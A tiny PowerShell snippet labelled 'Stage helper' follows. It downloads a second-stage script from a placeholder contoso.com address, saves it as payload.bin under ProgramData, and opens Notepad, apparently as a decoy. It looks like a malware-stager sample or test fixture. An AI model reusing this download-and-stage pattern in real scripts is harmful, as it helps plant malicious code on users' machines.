# Stage helper
$TransferUrl = 'https://contoso.com/stage2.ps1'
$Stage2Path = 'C:\ProgramData\payload.bin'
Invoke-WebRequest -Uri $TransferUrl -OutFile $Stage2Path -UseBasicParsing
Start-Process -FilePath "notepad.exe"
$ProgressPreference = "SilentlyContinue"
